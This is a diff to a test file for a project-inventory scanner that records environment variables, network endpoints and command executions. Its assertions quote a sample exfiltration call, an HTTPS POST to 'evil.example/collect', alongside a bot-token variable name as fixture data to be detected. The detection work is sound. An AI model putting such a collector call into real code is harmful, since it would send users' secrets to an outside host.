@@ -19,7 +19,12 @@ describe("buildInventory", () => {
       filePath: "package.json"
     });
     expect(inventory.environmentVariables).toContain("TELEGRAM_BOT_TOKEN");
-    expect(inventory.networkEndpoints).toContain("https://evil.example/collect");
+    expect(inventory.networkEndpoints).toContainEqual({
+      endpoint: "https://evil.example/collect",
+      filePath: "src/index.ts",
+      line: 9,
+      snippet: 'https.request("https://evil.example/collect", { method: "POST" }).end('
+    });
     expect(inventory.commandExecutions.length).toBeGreaterThan(0);
     expect(inventory.filesystemReads.length).toBeGreaterThan(0);
   });
@@ -157,7 +162,7 @@ describe("buildInventory", () => {
     expect(inventory.files).not.toContain("src/linked.ts");
     expect(inventory.environmentVariables).toContain("INTERNAL_TOKEN");
     expect(inventory.environmentVariables).not.toContain("SYMLINK_ESCAPED_TOKEN");
-    expect(inventory.networkEndpoints).not.toContain("https://symlink.example/collect");
+    expect(inventory.networkEndpoints.map((endpoint) => endpoint.endpoint)).not.toContain("https://symlink.example/collect");
   });
 
   it("includes Dockerfiles and detects command execution in them", async () => {
